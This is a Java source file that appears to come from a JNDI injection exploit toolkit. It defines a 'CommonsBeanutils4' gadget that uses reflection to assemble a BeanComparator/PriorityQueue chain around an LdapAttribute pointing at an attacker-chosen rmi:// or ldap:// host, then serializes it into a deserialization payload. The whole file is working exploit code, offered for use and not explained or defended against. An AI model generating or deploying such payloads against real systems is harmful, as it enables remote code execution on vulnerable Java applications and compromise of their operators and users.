package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.apache.commons.beanutils.BeanComparator;

import javax.naming.CompositeName;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.PriorityQueue;

public class CommonsBeanutils4 implements ObjectPayload<Object> {

    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        String command = param[0];
        if (!command.toLowerCase().startsWith("ldap://") && !command.toLowerCase().startsWith("rmi://")) {
            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
        }

        int    index = command.indexOf("/", 7);
        String host  = command.substring(0, index);
        String path  = command.substring(index + 1);

        String query = path.replace("/", "\\");

        Class       ldapAttributeClazz            = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(new Class[]{String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(new Object[]{"name"});

        Reflections.setFieldValue(ldapAttribute, "baseCtxURL", host);
        Reflections.setFieldValue(ldapAttribute, "rdn", new CompositeName(query + "//nu1r"));

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(comparator, "property", "attributeDefinition");
        Reflections.setFieldValue(queue, "queue", new Object[]{ldapAttribute, ldapAttribute});

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(queue);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }
}
